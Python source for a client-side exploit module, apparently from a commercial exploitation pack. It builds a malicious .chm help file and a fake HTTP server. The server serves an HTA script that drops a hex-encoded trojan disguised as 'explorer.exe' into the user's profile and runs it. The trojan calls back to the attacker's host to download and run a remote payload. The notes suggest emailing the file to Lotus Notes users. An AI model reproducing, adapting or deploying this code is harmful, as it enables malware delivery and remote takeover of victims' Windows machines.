#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2009
#

import sys
import thread

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from canvasexploit import canvasexploit
from libs.canvasos import *
from MOSDEF import pelib 
from libs.spkproxy import header, body

import canvasengine
import struct
import os


NAME = "Generic Malicous HTML HELP file"
DESCRIPTION = "Generic Malicous HTML HELP file"

VERSION = "1.0"

DOCUMENTATION = {}
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"
DOCUMENTATION["Notes"] = """
With this tool you can create a malicious HTML HELP file (.chm extension) which will download and
execute a HTTP/HTTPS MOSDEF trojan. This kind of file can't be read outside the local security zone
(for Intenret Explorer and Outlook for example because file attachment are readen from the Temporary
Internet Files directory which isn't in the local security zone)

But it works really good with other mail client like Lotus Notes. So you can send this file as an
attachment against a Lotus Notes client for example.
"""

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['2000','XP']

NOTES="""
Usage:
.\commandlineInterface.py -p 443 -v 13
.\d2sec_chm.py -l 192.168.52.1 -d 443 -O dstchm:data.chm -O useSSL:1
"""


class theexploit(tcpexploit):
	def __init__(self):
		tcpexploit.__init__(self)        
		
		self.name = NAME
		self.srcchm = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_chm/document.chm"
		self.dstchm = "newdoc.chm"		
		self.trojanname = "index.hta"
		self.useSSL = 0
		
		return
        
	# Create the hta file with the embedded binary
	def file4hta(self, exename):
		evilprog = "explorer.exe"
		e = []
		
		for a in exename:
			for b in a:
				if b == "\r":
					d = "0d"
				elif b == "\n":
					d = "0a"
				elif b == "\0":
					d = "00"
				else:
					c = hex(ord(b))
					d = c.replace("0x", "")
	
				if len(d) == 1:
					d = "0"+d
	
				e.append(d)
		
		i = 0
		j = 0
		l = len(e)
	
		hta = "<SCRIPT language=vbs>\n\n"
		while 1:
		  hta += " prog = prog & \""
	
		  while i != 24:
		    hta += "%s," % e[j]
		    if j == l-1:
		      break
		    i += 1
		    j += 1
	
		  if j == l-1:
		    hta = hta[:-1] + "\"\n\n"
		    break
		  hta += "\"\n"
		  i = 0
	
		hta += " tmp = Split(prog, \",\")\n"	
		hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
		hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
		hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
		hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
		hta += " Set f = fso.CreateTextFile(path, True)\n\n"
		hta += " For i = 0 To UBound(tmp)\n"
		hta += "   prog = Int(\"&H\" & tmp(i))\n"
		hta += "   f.Write Chr(prog)\n"
		hta += " Next\n\n"
		hta += " f.Close\n"
		hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
		hta += " self.Close\n"
		hta += "</SCRIPT>\n"
	
		return hta 
		
		
	def maketrojan(self):
		host = self.callback.ip
		port = self.callback.port		
		
		sc = shellcodeGenerator.win32()
		sc.addAttr("findeipnoesp", {"subespval":0x1000})                		
		                        	
		if self.useSSL:
			ssl = "s"
		else:
			ssl = ""                		
		                    
		sc.addAttr("httpGetShellcode", {"URL":"http%s://%s:%d/w" % (ssl, host, port)})		
		shellcode = sc.get()        		
		myPElib = pelib.PElib()		
		
		self.mosdeftrojan = myPElib.createPEFileBuf(shellcode)
        
		self.log("Writing out %d bytes to %s" % (len(self.mosdeftrojan), self.trojanname))

		self.htafile = self.file4hta(self.mosdeftrojan)
		
		file(self.trojanname, "wb").write(self.htafile)
		self.setInfo("%s - done" % (NAME))
		ret = len(self.mosdeftrojan) != 0
        
		return ret


	def makesploit(self, clientheader, clientbody):        		
		h = header('SERVER')
		b = body()
		
		self.maketrojan()
		        
		if clientheader.URL.count(self.trojanname):
			self.log("Sending MOSDEF trojan")
			f = open(self.trojanname, "rb")
			sploitstring = f.read()
			f.close()
			os.remove(self.trojanname)
			self.log("Sending %d bytes"%len(sploitstring))
			h.addHeader("Content-type","binary/octet-stream")
			h.addHeader("Connection","close")
			b.setBody(sploitstring)
		
		return h, b


	def neededListenerTypes(self):
		from canvasengine import HTTPMOSDEF
		return [HTTPMOSDEF]


  #################################################################################################################
  # Code from httpserver.py
	def listen(self):
		#self.getargs()
		s=self.gettcplistener(80, "0.0.0.0")

		if not s:
			self.log("Cannot listen on port 80 - perhaps that port is already bound?")
			return 0
				
		s.set_timeout(5)
		self.s=s
		
		return s 


	def accept(self, s=None ):
		"""
		Try to accept one connection
		returns true if we found one
		"""
		#we loop on this ,so no annoying printouts here
		#self.log("Accepting connection")
		if s==None:
			s=self.s 
		try:
			infd,addr=s.accept()
		except timeoutsocket.Timeout:
			#self.log("Timed out - no accept yet")
			return 
		if infd==-1:
			return
		
		#else we have an infd
		self.handle(infd)
		
		return True #handled connection
      
        
	def handle(self, infd): 
		self.log("Handling connection")
		clientheader = header(state = "SERVER")
		clientheader.ssl = self.ssl
		ret = clientheader.readdata(infd)
		clientbody = body()
        
		if clientheader.gotGoodHeader():
			if clientheader.bodySize()>0 or clientheader.wasChunked:
				self.log("Reading body")
				clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
				self.log("Read body")
		
		self.log("Creating exploit response")
		
		servheader,servbody = self.makesploit(clientheader,clientbody)
		
		self.log("Responding")
		
		bodydata="".join(servbody.data)
		            
		#now we respond...
		response = ""
		response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
	
	
		self.log(response)

		for akey in servheader.headerValuesDict.keys():
			if akey not in [ "Content-Length", "Content-length"]:
				response += servheader.grabHeader(akey)
				
		self.log("Sending header data of %d bytes"%len(response))
		chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
		
		if not chunked:
			response+="Content-Length: "+str(len(bodydata))+"\r\n"
			
		response+="\r\n"
		response+="".join(bodydata)
		self.log("Total response length is %d bytes"%len(response))
		
		try:
			infd.sendall(response)
		except socket.error:
			self.log("Connection closed by peer")
			
		self.log("Response sent")
		infd.close() #connection close - later on we'll keep it.
		
		return 
	#
	#################################################################################################################
        

	def startHTTPServer(self):
		s=self.listen()
        
		if not s:
			self.log("Failed to listen - not running")
			return 0
			
		while 1:
			if self.state==self.HALT:
				self.s.close()
				break
			self.accept()

		self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
        
		return 1

		
	def getArgs(self):
		self.dstchm = self.argsDict.get("dstchm", self.dstchm)		
		self.useSSL = int(self.argsDict.get("useSSL", self.useSSL))
			
		return

	def run(self):
		self.getArgs()
		
		# Open original CHM file
		f = open(self.srcchm, "rb")
		buff = f.read()
		f.close()
								
		buff = buff.replace("XXXXXXXXXXXXXXX", self.callback.ip + "X"*(15 - len(self.callback.ip)))
		
		# Create new CHM file
		f = open(self.dstchm, "wb")
		f.write(buff)
		f.close()

		self.log("New HTML HELP file %s created" % self.dstchm)
		
		thread.start_new_thread(self.startHTTPServer,())
		
		self.log("Fake HTTP server started")

		while 1:
			time.sleep(1)
		
		return 0
		

	def usage(self):        
		print "Usage: %s -l localip -d localport -O dstchm:dest_chm_path [-O useSSL:[0|1]]\n" % sys.argv[0]
		sys.exit(0) 


if __name__=='__main__':
	app = theexploit()
	ret = standard_callback_commandline(app)

